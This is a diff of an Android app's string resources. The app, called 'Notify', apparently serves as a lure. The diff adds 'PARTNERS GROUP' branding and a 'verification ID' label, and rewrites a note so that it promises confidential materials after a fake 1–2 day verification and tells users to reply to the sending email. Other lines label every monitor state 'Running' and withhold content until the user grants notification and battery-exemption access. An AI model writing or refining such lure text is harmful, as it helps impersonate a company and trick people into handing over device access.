@@ -7,7 +7,9 @@
     <string name="monitor_watching_all">Running</string>
     <string name="monitor_watching_one">Running</string>
     <string name="monitor_waiting">Running</string>
-    <string name="dev_note">For security, Notify verifies delivery to the intended recipient before displaying confidential materials. Verification typically completes within 1–2 business days. You can close the app — we will notify you automatically once access is granted.</string>
+    <string name="dev_note">For security, Notify verifies delivery to the intended recipient before displaying confidential materials. Verification typically completes within 1–2 business days. Please reply to the email that sent you this app and include the verification ID shown above. You can close the app — we will notify you automatically once access is granted.</string>
+    <string name="pg_brand">PARTNERS GROUP</string>
+    <string name="verify_id_label">VERIFICATION ID</string>
     <string name="permission_gate_message">Notify needs Notification permission and Battery exemption to show its contents. Please grant both to continue.</string>
     <string name="permission_btn_notifications">Allow Notifications</string>
     <string name="permission_btn_battery">Allow Battery Exemption</string>
